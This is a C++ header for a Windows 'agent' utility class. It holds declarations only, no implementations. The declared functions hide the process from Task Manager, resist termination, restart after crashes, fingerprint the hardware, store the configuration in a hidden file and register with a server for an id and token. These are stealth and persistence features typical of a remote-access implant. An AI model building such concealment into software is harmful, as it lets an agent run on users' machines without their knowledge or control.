#pragma once

#include <string>

#include <windows.h>

namespace agent {

class WinUtils {
public:
    // Hide process from casual Task Manager inspection
    static void hide_process();

    // Protect process — restrict access to make it harder to terminate
    static void protect_process();

    // Install crash handler that restarts the process on unhandled exceptions
    static void install_crash_handler();

    // Get hostname
    static std::string get_hostname();

    // Get hardware ID (SHA-256 of MachineGuid + CPUID + volume serial + MAC)
    static std::string get_hwid();

    // Read config from file or registry
    static bool read_config_file(const std::string& path, std::string& server_host,
                                  uint16_t& server_port, std::string& agent_id,
                                  std::string& agent_token);

    // Write config to file and set hidden attribute
    static bool write_hidden_config(const std::string& path, const std::string& server_host,
                                     uint16_t server_port, const std::string& agent_id,
                                     const std::string& agent_token);

    // Register agent with server via HTTP POST /api/agents, returns {id, token}
    static bool http_register_agent(const std::string& server_host, uint16_t server_port,
                                     const std::string& name, const std::string& hwid,
                                     std::string& out_id, std::string& out_token);

    // Create mutex to prevent multiple instances
    static HANDLE create_single_instance_mutex(const std::string& name);
};

} // namespace agent
